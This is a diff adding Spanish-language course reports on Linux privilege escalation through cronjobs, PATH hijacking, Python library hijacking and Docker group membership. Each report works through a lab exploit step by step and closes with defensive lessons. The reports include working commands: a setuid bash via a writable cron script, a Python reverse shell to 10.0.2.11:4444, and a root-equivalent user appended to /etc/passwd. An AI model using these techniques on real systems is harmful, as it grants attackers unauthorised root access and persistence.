@@ -450,3 +450,318 @@ Para los profesionales de la seguridad, la capacidad de identificar y explotar e
 
 ---
 
+Documentos de Referencia: "AS-II - Escalada de privilegios II (1).pdf"
+
+# Informe Técnico: Escalada de Privilegios en Linux Utilizando Cronjobs
+
+## 1. Resumen Ejecutivo
+Este informe técnico detalla el proceso de escalada de privilegios en sistemas Unix, específicamente explotando configuraciones defectuosas del demonio **cron**. Se explican los conceptos de **cron** y **cronjobs**, se presenta una metodología paso a paso para identificar y explotar estas vulnerabilidades, y se ilustra con un caso práctico. El objetivo es demostrar cómo un usuario con bajos privilegios puede obtener acceso de **superusuario** (root) si una tarea programada está mal configurada.
+
+## 2. Conceptos Fundamentales
+
+### El Demonio Cron
+El demonio **cron** es un proceso del sistema Unix que permite la ejecución de tareas de manera periódica. Es una herramienta fundamental para los administradores de sistemas, ya que se utiliza para automatizar tareas rutinarias como:
+* Realizar copias de seguridad.
+* Limpiar directorios temporales.
+* Reiniciar la máquina.
+* Realizar actualizaciones nocturnas.
+
+### Cronjobs
+Los **cronjobs** son las tareas programadas que se ejecutan mediante el demonio **cron**. Estas tareas se definen en un archivo llamado **crontab** y se ejecutan con permisos de **superusuario**. Esto es un punto crítico de seguridad, ya que una configuración incorrecta puede permitir a un atacante con pocos privilegios modificar una tarea y hacer que ejecute un comando malicioso con permisos elevados. La vulnerabilidad no reside en el servicio **cron** en sí mismo, sino en la mala configuración de las acciones que realiza.
+
+### El Archivo crontab
+El archivo **crontab** es donde se especifican la periodicidad de ejecución y el comando a ejecutar para cada **cronjob**. Este archivo define las acciones que realizará el demonio **cron**. La sintaxis de cada línea de **crontab** se divide en campos, los cuales, como se muestra en la captura de pantalla de la página 2, definen la periodicidad de la tarea:
+* **Minuto (0-59)**
+* **Hora (0-23)**
+* **Día del mes (1-31)**
+* **Mes (1-12)**
+* **Día de la semana (0-6), donde 0 y 7 son domingo**
+* **Comando a ejecutar**
+
+Cuando un comando se ejecuta a través de **crontab**, lo hace con permisos de **superusuario**. Por lo tanto, la clave para una escalada de privilegios es modificar el archivo **crontab** o el *script* que ejecuta.
+
+## 3. Procedimientos Prácticos
+
+### 1. Detección y Análisis de Cronjobs
+El primer paso para un atacante es determinar si el demonio **cron** se está ejecutando y qué acciones realiza. Esto se puede lograr de dos maneras:
+* **Manual:** Revisando el archivo **crontab**, que generalmente se encuentra en el directorio `/etc/`.
+* **Automatizada:** Utilizando una herramienta como **pspy**. Esta herramienta monitorea los procesos del sistema en tiempo real sin requerir privilegios de **root**.
+
+**Cómo funciona pspy:**
+* **pspy** utiliza notificaciones de eventos del sistema para observar cambios en los directorios `/proc` y `/dev`.
+* Esto le permite detectar procesos que se inician con permisos de **root**, incluso si no están visibles en el **crontab** principal.
+* Revela la periodicidad de los **cronjobs**, lo que ayuda al atacante a sincronizar su ataque.
+* Muestra comandos completos, lo que puede exponer rutas vulnerables.
+
+El objetivo de este paso, como se muestra en la captura de pantalla de la página 9, es identificar una tarea programada por **cron** que pueda ser manipulada.
+
+### 2. Identificación de la Vulnerabilidad
+Una vez que se ha identificado un **cronjob**, el atacante debe buscar un punto de entrada. La vulnerabilidad principal no suele estar en el archivo **crontab** en sí, sino en los permisos de los directorios o *scripts* que se ejecutan.
+
+Dos riesgos clave son:
+* **Riesgo 1:** Directorios como `/etc/cron.hourly/` o `/etc/cron.daily/` tienen permisos de escritura para usuarios con pocos privilegios. Un atacante podría colocar un *script* malicioso en uno de estos directorios, que se ejecutaría con permisos de **root** cuando **cron** se active.
+* **Riesgo 2:** Un archivo ejecutado por **cron**, como `/etc/logrotate.d/logrotate`, es modificable por un usuario de bajos privilegios. Un atacante podría editar el archivo para ejecutar su propio código con permisos de **root**.
+
+En el laboratorio práctico, se analiza el archivo `/etc/crontab` y se observa una tarea que ejecuta el *script* `/etc/logrotate.d/logrotate` con permisos de **root** cada 30 segundos, como se muestra en las capturas de pantalla de las páginas 5 y 7. El análisis posterior del *script* revela que es un archivo de Python que borra el contenido del directorio `/tmp`. El riesgo de seguridad reside en el uso de un comodín (`*`) en la ruta, que puede ser explotado.
+
+### 3. Explotación de la Vulnerabilidad
+El objetivo es modificar el *script* con permisos de escritura para que ejecute un comando que permita la escalada de privilegios.
+* **Verificación de Permisos:** Antes de la modificación, se verifica que el usuario **www-data** tiene permisos de escritura sobre el archivo `/etc/logrotate.d/logrotate` utilizando el comando `ls -l /etc/logrotate.d/logrotate`, como se muestra en la captura de pantalla de la página 12. La salida del comando (`-rwxrwxrwx`) confirma que cualquier usuario puede leer, escribir y ejecutar el archivo.
+* **Modificación del Script:** Se sobrescribe el contenido del *script* original con un comando malicioso. En el ejemplo, se usa el comando `echo` con la redirección `>` para sustituir el contenido del archivo, ya que el atacante podría no tener acceso a un editor de texto como **nano**.
+
+El comando utilizado es:
+`echo 'chmod 4755 /bin/bash' > logrotate`.
+
+**Análisis del Comando `chmod 4755 /bin/bash`:**
+* `chmod`: Comando para cambiar los permisos de un archivo.
+* `4755`: Los dígitos representan permisos:
+    * `4`: Activa el bit **SUID** (Set User ID). Esto permite que el archivo se ejecute con los permisos de su dueño, en este caso, **root**.
+    * `7`: Permisos del dueño (`rwx`, leer, escribir, ejecutar).
+    * `5`: Permisos del grupo (`r-x`, leer, ejecutar).
+    * `5`: Permisos de otros usuarios (`r-x`, leer, ejecutar).
+* `/bin/bash`: La ruta al *shell* **bash**.
+
+Al ejecutar este comando, el *script* `logrotate` cambia los permisos de `/bin/bash` para activar el bit **SUID**.
+
+### 4. Obtención de la Shell de Root
+Una vez que el bit **SUID** de `/bin/bash` ha sido establecido, el atacante puede ejecutar el **bash** *shell* con permisos de **root**.
+* **Verificación de Permisos:** El cambio de permisos se verifica con el comando `ls -l /bin/bash`. Como se muestra en las capturas de pantalla de las páginas 13 y 14, la letra `x` en los permisos del dueño cambia a una `s` (`-rwsr-xr-x`), lo que indica que el bit **SUID** está activado.
+* **Ejecución de la Shell:** El comando `bash -p` permite al atacante obtener una *shell* de **root**.
+* **Verificación de Identidad:** Finalmente, se verifica que el usuario es **root** con el comando `whoami`.
+
+## 4. Conclusiones y Puntos Clave
+
+### Importancia y Beneficios de Seguridad
+Esta demostración resalta la importancia de una configuración de seguridad rigurosa en los sistemas Unix. Una simple mala configuración en una tarea automatizada puede ser el vector de ataque para una escalada de privilegios. El principal beneficio de comprender este proceso es que los administradores de sistemas pueden tomar medidas preventivas, como:
+* Limitar los permisos de escritura en directorios utilizados por **cronjobs**.
+* Evitar el uso de comodines en comandos que se ejecutan con privilegios de **root**.
+* Auditar regularmente los archivos de **crontab** y los *scripts* que se ejecutan.
+
+### Puntos de Aprendizaje Clave
+* **Cronjobs y permisos:** Las tareas de **cron** se ejecutan con permisos de **superusuario**. Cualquier modificación en un *script* o archivo ejecutado por **cron** puede llevar a una escalada de privilegios.
+* **Herramientas de monitoreo:** Herramientas como **pspy** son esenciales para que los atacantes, e incluso los defensores, monitoreen la actividad del sistema y detecten procesos ocultos o periódicos.
+* **Bit SUID:** El bit **SUID** es un permiso de archivo avanzado que permite que un ejecutable se ejecute con los privilegios de su dueño. Si se aplica a un *shell* como **bash**, puede otorgar acceso de **root** a un usuario sin privilegios.
+* **Vulnerabilidades de configuración:** A menudo, las vulnerabilidades no residen en el *software* en sí, sino en las configuraciones incorrectas que permiten a un atacante manipular el comportamiento esperado del sistema.
+
+### Relevancia Técnica
+El procedimiento de explotación de **cronjobs** es una técnica fundamental en el campo de la ciberseguridad ofensiva y defensiva. En un entorno profesional, este conocimiento es crucial para:
+* **Pruebas de penetración:** Los *pentesters* utilizan este método para evaluar la postura de seguridad de un sistema y encontrar rutas de escalada de privilegios.
+* **Análisis forense:** Los analistas pueden buscar la presencia de un *cronjob* malicioso o un *shell* con el bit **SUID** activado como evidencia de un compromiso del sistema.
+* **Hardening de sistemas:** Los ingenieros de seguridad utilizan este conocimiento para fortalecer los sistemas, asegurándose de que las tareas de **cron** y los *scripts* relacionados tengan los permisos más restrictivos posibles.
+
+---
+
+Documentos de Referencia: "AS-II - Escalada de privilegios II.pdf"
+
+# Informe Técnico: Escalada de Privilegios en Linux Utilizando Path Hijacking
+
+## 1. Resumen Ejecutivo
+Este informe técnico detalla el proceso de escalada de privilegios en sistemas Unix y Linux mediante la explotación de una técnica conocida como **Path Hijacking** (secuestro de ruta). La metodología se centra en manipular la variable de entorno `PATH` para que un sistema, al invocar un binario sin una ruta absoluta, ejecute en su lugar un binario malicioso controlado por el atacante. El ataque es especialmente efectivo cuando se combina con binarios que tienen privilegios elevados, como el bit **SUID**.
+
+---
+## 2. Conceptos Fundamentales
+
+### El Path
+En los sistemas operativos Unix, el **path** es una variable de entorno que define una lista de directorios donde el sistema busca programas ejecutables o binarios. Esto permite a los usuarios ejecutar comandos comunes como `ls` o `cat` sin tener que especificar la ruta completa del binario. La variable `PATH` ahorra tiempo y esfuerzo, ya que el sistema se encarga de encontrar el binario por sí mismo.
+
+Para visualizar el contenido de la variable `PATH`, se utiliza el comando `echo $PATH`. La salida de este comando muestra una serie de directorios separados por dos puntos (:).
+
+### Path Hijacking
+El **Path Hijacking** es un tipo de ataque de escalada de privilegios que consiste en modificar la variable de entorno `PATH` para engañar al sistema. El objetivo es insertar un directorio controlado por el atacante al principio de la lista de directorios del `PATH`. De esta manera, cuando un programa o *script* invoca a otro binario sin especificar su ruta absoluta (por ejemplo, llamando a `cat` en lugar de `/bin/cat`), el sistema busca primero en el directorio malicioso, encuentra el binario falso y lo ejecuta.
+
+Para que este ataque tenga éxito en un contexto de escalada de privilegios, el binario que invoca la llamada debe ejecutarse con permisos de **superusuario** (**root**) o tener el bit **SUID** activado. Al lograr que el binario privilegiado ejecute el binario malicioso del atacante, las acciones del binario malicioso se ejecutarán con los permisos elevados heredados del binario original.
+
+---
+## 3. Procedimientos Prácticos
+
+### 1. Detección de Binarios SUID y Vulnerabilidades
+El primer paso para un atacante es identificar binarios en el sistema que se ejecuten con privilegios elevados, como el bit **SUID**. Un comando útil para esta tarea es `find / -perm -u=s -type f 2>/dev/null`.
+
+* **`find /`**: Inicia la búsqueda desde la raíz del sistema de archivos, asegurando que se revisen todos los directorios.
+* **`-perm -u=s`**: Busca archivos que tienen el bit **SUID** activado. Este permiso especial permite que el archivo se ejecute con los permisos del propietario, que podría ser el usuario **root**.
+* **`-type f`**: Restringe la búsqueda a archivos regulares, excluyendo directorios y enlaces simbólicos.
+* **`2>/dev/null`**: Redirige los errores estándar (`stderr`) a un "agujero negro" virtual, lo que suprime los mensajes de "Permiso denegado" y hace que la salida sea más limpia.
+
+Como se muestra en la captura de pantalla de la página 7, la ejecución de este comando revela una lista de binarios con el bit **SUID** activo. En el laboratorio práctico, se identifica el binario `/opt/statuscheck` como un candidato potencial.
+
+### 2. Análisis del Binario
+Una vez que se encuentra un binario con privilegios, el siguiente paso es determinar si hace llamadas a otros binarios sin usar rutas absolutas.
+
+* **`ls -l /opt/statuscheck`**: Este comando verifica los permisos del binario. El resultado `-rwsr-xr-x` confirma que tiene el bit **SUID** (`s`) y pertenece a **root**.
+* **`strings /opt/statuscheck`**: Dado que el binario es un archivo compilado y no un *script* legible, se usa el comando `strings` para extraer cadenas de texto legibles de su código máquina. El análisis de la salida de `strings` revela una llamada a `curl -I H`, lo que indica que el binario invoca al programa `curl` sin especificar su ruta absoluta (`/usr/bin/curl`).
+
+### 3. Explotación: Creación del Binario Malicioso y Modificación del PATH
+Habiendo confirmado la vulnerabilidad, el atacante procede a crear un binario malicioso y a modificar la variable `PATH`.
+
+* **Creación del binario malicioso**: El atacante se dirige a un directorio con permisos de escritura, como `/tmp`. Utilizando el comando `echo '/bin/sh' > curl`, se crea un archivo llamado `curl` que contiene un *payload* simple: la ejecución de una *shell* de **bash**. Luego, se le otorgan permisos de ejecución a este nuevo archivo con `chmod 777 curl`.
+* **Modificación del PATH**: El atacante manipula la variable de entorno `PATH` para que el directorio `/tmp` se convierta en el primer lugar de búsqueda. Esto se logra con el comando `export PATH=/tmp:$PATH`. Al ejecutar `echo $PATH`, se puede verificar que `/tmp` ahora está al principio de la lista, como se muestra en la captura de pantalla de la página 10.
+
+### 4. Ejecución del Binario y Obtención de la Shell de Root
+Finalmente, el atacante ejecuta el binario vulnerable `/opt/statuscheck`.
+* El sistema ejecuta el binario `/opt/statuscheck`, el cual, debido al bit **SUID**, se ejecuta con privilegios de **root**.
+* El binario intenta invocar a `curl` sin una ruta absoluta, por lo que el sistema consulta la variable `PATH`.
+* Al encontrar el directorio `/tmp` en primer lugar, el sistema ejecuta el binario `curl` malicioso en lugar del original.
+* El *payload* dentro del `curl` malicioso se activa, abriendo una *shell* con los permisos de **root** heredados del binario `statuscheck`.
+* El atacante verifica que ahora tiene privilegios de **root** al ejecutar `whoami`, tal como se muestra en la captura de pantalla de la página 11.
+
+---
+## 4. Conclusiones y Puntos Clave
+
+### Importancia y Beneficios de Seguridad
+El **Path Hijacking** es un vector de ataque que resalta la importancia de codificar las llamadas a binarios utilizando **rutas absolutas** en programas privilegiados. Si el binario `/opt/statuscheck` hubiera llamado a `/usr/bin/curl` en lugar de simplemente a `curl`, el ataque no habría tenido éxito. Un beneficio clave es que los desarrolladores y administradores pueden proteger sus sistemas al adherirse a esta práctica, impidiendo que la variable `PATH` manipulada afecte la ejecución de comandos críticos.
+
+### Puntos de Aprendizaje Clave
+* **La variable de entorno PATH**: Comprender su función es fundamental para entender cómo los comandos se resuelven en el sistema.
+* **Binarios con privilegios**: La búsqueda de archivos con el bit **SUID** activado es un paso crítico en muchas técnicas de escalada de privilegios.
+* **Llamadas a binarios**: La forma en que se invoca a los binarios es crucial para la seguridad. El uso de rutas absolutas es una medida de protección vital.
+* **Combinación de vulnerabilidades**: La técnica de **Path Hijacking** por sí sola no permite la escalada de privilegios; debe combinarse con un binario que ya se ejecute en un contexto privilegiado.
+
+### Relevancia Técnica
+Esta técnica es de gran relevancia para los profesionales de la ciberseguridad. En un entorno profesional, este conocimiento se utiliza para:
+* **Pruebas de penetración**: Identificar y explotar la mala configuración de la variable `PATH` como una forma de evaluar la seguridad de un sistema.
+* **Desarrollo seguro**: Educar a los programadores para que utilicen rutas absolutas en *scripts* y binarios que requieran privilegios, previniendo así este tipo de ataque.
+* **Análisis de vulnerabilidades**: Examinar el código de aplicaciones privilegiadas para detectar llamadas a binarios sin rutas absolutas, que podrían ser puntos de entrada para atacantes.
+
+---
+
+Documentos de Referencia: "AS-II - Escalada de privilegios II.pdf"
+
+# Informe Técnico: Escalada de Privilegios en Linux Utilizando Python Library Hijacking
+
+## 1. Resumen Ejecutivo
+Este informe técnico detalla el proceso de escalada de privilegios en sistemas Unix mediante la técnica de **Python Library Hijacking** (secuestro de librerías de Python). Se explora cómo el funcionamiento del intérprete de Python, al buscar librerías, puede ser explotado por un atacante. El objetivo es manipular la carga de librerías para ejecutar código malicioso con privilegios elevados, especialmente cuando el *script* original se ejecuta con permisos de **superusuario** (**root**) o a través de **sudo**.
+
+---
+## 2. Conceptos Fundamentales
+
+### Python Library Hijacking
+**Python Library Hijacking**, o secuestro de librerías de Python, es una técnica de escalada de privilegios que aprovecha la forma en que el intérprete de Python importa librerías. Cuando un *script* de Python utiliza el comando `import`, el intérprete busca la librería en directorios específicos siguiendo un orden predefinido. La vulnerabilidad reside en que, por defecto, el intérprete busca primero en el mismo directorio donde se está ejecutando el *script* principal.
+
+Esto presenta un riesgo de seguridad significativo, ya que un atacante con permisos de escritura en dicho directorio podría colocar una librería falsa con el mismo nombre que la original. Cuando el *script* legítimo intente importar la librería, cargará la versión manipulada por el atacante en su lugar. Si el *script* original tiene privilegios de **root** o **sudo**, las acciones del código malicioso se ejecutarán con esos mismos privilegios.
+
+### Opciones de Ataque
+Existen tres variantes principales para realizar este ataque:
+* **Escritura en el mismo directorio:** El atacante crea una librería maliciosa en el mismo directorio que el *script* de Python privilegiado. Esta es la vía más sencilla, ya que la búsqueda del intérprete prioriza este directorio.
+* **Modificación del *path* de Python:** Si el atacante no puede escribir en el directorio del *script*, puede intentar manipular la variable de entorno **PYTHONPATH**. Esto le permite añadir un directorio de su elección al principio de la ruta de búsqueda de librerías de Python, forzando al intérprete a cargar su librería falsa desde ese nuevo directorio.
+* **Modificación de la librería original:** En casos menos comunes, si la librería original tiene permisos de escritura, el atacante podría incrustar su código directamente en ella. Esto asegura que el código malicioso se ejecute cada vez que el programa principal invoque la librería.
+
+---
+## 3. Procedimientos Prácticos
+
+### 1. Detección de Scripts Python Privilegiados
+El primer paso del atacante es identificar un *script* de Python en el sistema que se ejecute con privilegios especiales, ya sea a través de **sudo**, el bit **SUID**, o alguna otra *capability*. Estos privilegios son necesarios para que la escalada tenga éxito.
+
+En el laboratorio práctico, el administrador del sistema ha configurado un permiso de **sudo** para que un usuario sin privilegios, `chema`, pueda ejecutar un *script* de Python llamado `hack.py`. Este *script* legítimo importa la librería `webbrowser` y la utiliza para abrir una página web.
+
+### 2. Análisis del Escenario
+El atacante, con el usuario `chema`, analiza la situación para determinar la mejor vía de ataque.
+* **Verificación de permisos del script original:** El *script* `hack.py` se ejecuta con permisos de **sudo**. Esto confirma que cualquier acción que realice el *script* heredará los privilegios de **root**.
+* **Análisis de la librería original:** Al ejecutar `ls -l /usr/lib/python3.11/webbrowser.py`, se comprueba que la librería original pertenece a **root** y el usuario `chema` no tiene permisos de escritura sobre ella. Por lo tanto, la "Opción 3" no es viable.
+* **Determinación de la ruta de búsqueda:** El intérprete de Python busca la librería en el mismo directorio del *script* antes de buscar en la ruta de las librerías del sistema. Esto hace que la "Opción 1" sea una vía de ataque factible.
+
+### 3. Explotación: Inyección de Código Malicioso
+Con el escenario de ataque definido, el atacante procede a crear una librería falsa en el mismo directorio que el *script* `hack.py`.
+
+* **Creación del *payload*:** El objetivo es obtener una **reverse shell** para tener control total del sistema. Para ello, el atacante utiliza un generador de *shells* en línea como `revshells.com` para crear un comando de Python que se conecte a una dirección IP y puerto específicos y abra una *shell*.  El código del *payload* es:
+`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")`.
+
+* **Creación de la librería maliciosa:** Utilizando el comando `echo` y la redirección `> webbrowser.py`, el atacante inyecta el *payload* en un nuevo archivo llamado `webbrowser.py` en el mismo directorio que `hack.py`.
+
+### 4. Obtención de la Shell de Root
+Con la librería maliciosa en su lugar, el atacante se prepara para recibir la *reverse shell*.
+* **Escucha:** El atacante utiliza `nc -lvp 4444` para ponerse a la escucha en el puerto 4444.
+* **Ejecución del *script* vulnerable:** El atacante ejecuta el *script* privilegiado `hack.py` con el comando `sudo /usr/bin/python3.11 /home/chema/hack.py`.
+* **Resultado:** En lugar de abrir el navegador, el *script* importa la librería `webbrowser.py` maliciosa, lo que desencadena el *payload*. La *shell* se abre con los permisos de **sudo** que el *script* `hack.py` heredó, lo que le da al atacante una *shell* de **root**.
+
+### 5. Alternativa: Ataque por Modificación de PYTHONPATH
+Si el atacante no tuviera permisos para escribir en el directorio del *script* original, podría intentar modificar el **PYTHONPATH**.
+
+* **Escenario de privilegio adicional:** Para que esta alternativa funcione, el usuario `chema` necesitaría un privilegio adicional en el archivo `visudo` que le permita modificar variables de entorno.
+* **`SETENV` en `visudo`:** El administrador debe añadir `SETENV` a la línea de permisos de `chema` en `visudo`: `chema ALL=(root) NOPASSWD: SETENV /usr/bin/python3.11`.
+* **Ejecución con `PYTHONPATH`:** Con este permiso, el atacante puede usar `sudo PYTHONPATH=/tmp/ /usr/bin/python3.11 /home/chema/hack.py`. Esto le dice al intérprete que busque librerías primero en `/tmp/` donde se encuentra la librería maliciosa. El resultado es el mismo: el atacante obtiene una *shell* de **root**.
+
+---
+## 4. Conclusiones y Puntos Clave
+
+### Importancia y Beneficios de Seguridad
+Esta técnica subraya un principio fundamental de la seguridad en sistemas: la importancia de una gestión de privilegios rigurosa y de la validación del código. Las configuraciones de **sudo** que permiten a usuarios no privilegiados ejecutar *scripts* con permisos de **root** pueden ser un punto de entrada crítico si el *script* no está bien asegurado. El principal beneficio de comprender este ataque es la prevención, que incluye:
+* **Principio de Mínimo Privilegio:** Otorgar solo los permisos estrictamente necesarios.
+* **Validación de la ruta de búsqueda:** Asegurarse de que los *scripts* privilegiados no dependan de librerías que puedan ser manipuladas por usuarios no privilegiados.
+* **Auditoría de configuraciones:** Revisar regularmente el archivo `visudo` y los permisos de archivos y directorios para detectar configuraciones inseguras.
+
+### Puntos de Aprendizaje Clave
+* **Comportamiento del intérprete de Python:** Es crucial entender el orden en que Python busca e importa librerías, ya que esta es la base del ataque.
+* **Gestión de privilegios:** El ataque demuestra que incluso si un *script* parece inofensivo, si se ejecuta con privilegios elevados, puede ser explotado si se puede inyectar código malicioso en su ruta de ejecución.
+* **Control y granularidad de `sudo`:** La diferencia entre los permisos de **sudo** y **root** es vital. **Sudo** permite un control más granular, como se vio al requerir **SETENV** para modificar el **PYTHONPATH**.
+
+### Relevancia Técnica
+El **Python Library Hijacking** es una técnica de escalada de privilegios que tiene una gran relevancia en el ámbito profesional de la ciberseguridad. Los *pentesters* pueden utilizarla para simular ataques y evaluar la postura de seguridad de una organización, mientras que los equipos de defensa pueden usar este conocimiento para implementar medidas de seguridad preventivas. Esto incluye no solo la revisión de permisos, sino también la educación de los desarrolladores para que sean conscientes de los riesgos al manejar privilegios y la importación de librerías.
+
+---
+
+Documentos de Referencia: "AS-II - Escalada de privilegios II.pdf"
+
+# Informe Técnico: Escalada de Privilegios en Linux Utilizando Docker
+
+## 1. Resumen Ejecutivo
+Este informe técnico profundiza en la escalada de privilegios en sistemas Unix explotando servicios de contenedores como **Docker** y **LXD**. La vulnerabilidad principal no radica en el *software* en sí, sino en el modelo de permisos. El demonio de Docker requiere privilegios de **root** para funcionar, lo que significa que cualquier usuario que pertenezca al grupo **`docker`** puede ejecutar comandos con permisos de **superusuario** de manera inmediata y sin necesidad de una contraseña. Se detallan los procedimientos que un atacante podría seguir para aprovechar esta configuración y obtener acceso de **root**.
+
+---
+
+## 2. Conceptos Fundamentales
+
+### El Demonio Docker
+El demonio de **Docker** es un servicio que permite crear y gestionar contenedores en un sistema operativo. Debido a la naturaleza de la tecnología de contenedores, que emula máquinas virtuales ligeras, el demonio de Docker requiere privilegios de **superusuario** para ejecutarse. Como consecuencia, los usuarios que necesitan interactuar con Docker deben ser miembros del grupo **`docker`**.
+
+### Privilegios del Grupo Docker
+La pertenencia al grupo **`docker`** otorga a un usuario la capacidad de realizar acciones privilegiadas, lo que en la práctica es equivalente a tener acceso constante a **root** sin necesidad de una contraseña. Un usuario no privilegiado en este grupo puede, por ejemplo, montar directorios sensibles del sistema anfitrión, como `/etc/shadow`, lo que le permitiría acceder y modificar archivos del sistema como si fuera el **superusuario**.
+
+### LXD
+**LXD** es un servicio de contenedores similar a Docker, construido sobre la tecnología **LXC**. Al igual que con Docker, un usuario que pertenezca al grupo local **`lxd`** puede escalar sus privilegios a **root** de forma instantánea. Este proceso no requiere que el usuario tenga derechos de **sudo** ni que ingrese su contraseña. **LXD** es un proceso de **root** que a menudo no iguala los privilegios del usuario que lo invoca.
+
+---
+
+## 3. Procedimientos Prácticos
+
+### 1. Detección y Verificación de la Pertenencia a un Grupo Privilegiado
+El primer paso para un atacante es verificar si su usuario actual pertenece a los grupos **`docker`** o **`lxd`**.
+
+* **Comando `id`**: Para verificar la pertenencia a un grupo, se utiliza el comando `id`.
+* **Análisis del resultado**: La salida del comando `id` mostrará una lista de los grupos a los que pertenece el usuario. Si el grupo **`docker`** o **`lxd`** aparece en la lista, la escalada de privilegios es posible. Por ejemplo, en el laboratorio, el `output` de `id` para el usuario `chema` es `uid=1001(chema) gid=1001(chema) groups=1001(chema),139(docker)`, lo que confirma que es miembro del grupo **`docker`**.
+
+### 2. Escalada de Privilegios Mediante Docker
+Si el atacante es miembro del grupo **`docker`**, el siguiente paso es ejecutar un contenedor y montar un directorio del sistema anfitrión para obtener acceso privilegiado.
+
+* **Comando `docker run`**: Se utiliza este comando para crear y ejecutar un nuevo contenedor a partir de una imagen.
+* **Montaje de volumen (`-v`)**: La opción `-v` (`--volume`) se usa para montar un directorio del sistema anfitrión dentro del contenedor.
+* **Comando de ejemplo**: `docker run -v /etc/:/mnt/ -it alpine`.
+    * **`docker run`**: Ejecuta el contenedor.
+    * **`-v /etc/:/mnt/`**: Monta el directorio `/etc/` del sistema anfitrión dentro del contenedor en el directorio `/mnt/`.
+    * **`-it`**: Mantiene la sesión interactiva, permitiendo al atacante usar una *shell* dentro del contenedor.
+    * **`alpine`**: Utiliza la imagen `alpine`, que es una imagen ligera de Linux.
+
+### 3. Explotación y Obtención de Acceso Persistente
+Una vez que el contenedor está en ejecución, el atacante puede acceder a los archivos del sistema anfitrión con privilegios de **superusuario**.
+
+* **Acceso a archivos sensibles**: Dentro del contenedor, el atacante puede navegar al directorio `/mnt/` para acceder a los archivos de configuración del sistema anfitrión, como `/etc/shadow` o `/etc/passwd`.
+* **Creación de un nuevo usuario**: Una de las formas más efectivas de obtener acceso persistente es crear un nuevo usuario con privilegios de **root**.
+    * **Generar un *hash* de contraseña**: Se usa un comando como `openssl passwd -1 -salt abc chema` para crear un *hash* de una contraseña conocida, como `chema`. El `output` incluye el algoritmo (`$1$`), el *salt* (`abc`), y el *hash* real.
+    * **Modificar el archivo `passwd`**: Con acceso de escritura al archivo `/etc/passwd` del anfitrión, el atacante utiliza un comando como `echo 'chema3:$1$abc$0GBUjwj8F6EV.d.CNPj4U:0:0::/root/:/bin/sh' >> passwd`.
+    * **Análisis de la entrada**: Esta línea añade un nuevo usuario (`chema3`) con un **UID** y **GID** de `0`, lo que le otorga los mismos permisos que el usuario **root**. El atacante puede ahora iniciar sesión como `chema3` usando la contraseña conocida.
+* **Verificación de privilegios**: El atacante confirma que tiene privilegios de **root** al ejecutar `whoami`.
+
+---
+
+## 4. Conclusiones y Puntos Clave
+
+### Importancia y Beneficios de Seguridad
+La escalada de privilegios a través de **Docker** y **LXD** ilustra un riesgo de seguridad crítico en la gestión de permisos en sistemas Linux. El principal beneficio de comprender esta vulnerabilidad es que los administradores de sistemas pueden tomar medidas proactivas para prevenirla. La mitigación más importante es seguir el **principio de mínimo privilegio**, asegurándose de que los usuarios no se añadan al grupo **`docker`** a menos que sea absolutamente necesario y que no haya otras alternativas seguras.
+
+### Puntos de Aprendizaje Clave
+* **La pertenencia a un grupo es clave**: Ser miembro de grupos como **`docker`** o **`lxd`** es una puerta de entrada directa a privilegios de **superusuario**.
+* **El demonio como un punto de control**: La escalada es posible porque el demonio de Docker se ejecuta con privilegios de **root**, lo que permite a los usuarios del grupo ejecutar comandos de alto nivel en su nombre.
+* **La vulnerabilidad no es de *software***: El riesgo no está en un fallo de código de Docker, sino en una configuración de permisos que, por la naturaleza del servicio, es inherentemente de alto riesgo.
+* **Acceso persistente**: Una vez que se obtienen los privilegios de **root**, los atacantes suelen buscar formas de mantener el acceso, como la creación de nuevos usuarios privilegiados, lo que les permite volver al sistema en cualquier momento sin tener que explotar la vulnerabilidad original de nuevo.
+
+### Relevancia Técnica
+Para los profesionales de la ciberseguridad, esta técnica es fundamental. En las pruebas de penetración, es uno de los primeros vectores que se exploran para la escalada de privilegios. La capacidad de un atacante para pasar de un usuario con privilegios limitados a un **superusuario** es un paso crítico en el ciclo de vida de un ataque. Por lo tanto, comprender esta vulnerabilidad es esencial tanto para los atacantes como para los defensores, ya que permite identificar y mitigar riesgos en entornos de producción.
